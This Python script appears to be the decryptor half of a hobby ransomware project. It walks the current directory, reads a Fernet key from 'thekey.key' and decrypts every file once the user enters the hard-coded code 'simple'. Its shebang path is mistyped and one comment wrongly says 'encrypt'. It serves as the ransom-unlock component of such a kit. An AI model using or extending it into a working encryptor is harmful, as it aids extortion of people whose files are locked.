#!/user/bin/env python3

# importation of the librairies
import os
from cryptography.fernet import Fernet # librairi to encrypt informations. You need the key to uncrypt

# Start with find some files

files = []

# Starting directory
start_directory = "."

# function who find the file on top of the starting directory
def find_files_recursively(directory):
    for item in os.listdir(directory):
        full_path = os.path.join(directory, item)  # take the path
        if os.path.isdir(full_path):  # if it's a directory start the function with the new path
            find_files_recursively(full_path)
        elif os.path.isfile(full_path): 
            if item == "ransomware.py" or item == "thekey.key" or item == "decrypt.py":  # ignore the program
                continue
            files.append(full_path)  # add the file to the list

# Start the search
find_files_recursively(start_directory)

# Recuperation of the key
with open("thekey.key", "rb") as key:
    secretkey = key.read()


secretcode = "simple"

user_phrase = input("Enter the secret code to decrypt your file\n")

if user_phrase == secretcode:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read() # take the contents
        contents_decrypted = Fernet(secretkey).decrypt(contents) # encrypt the contents
        
        # open another time the file to write on the previous data
        with open(file, "wb") as thefile: 
            thefile.write(contents_decrypted)
else:
    print("wrong secret phrase")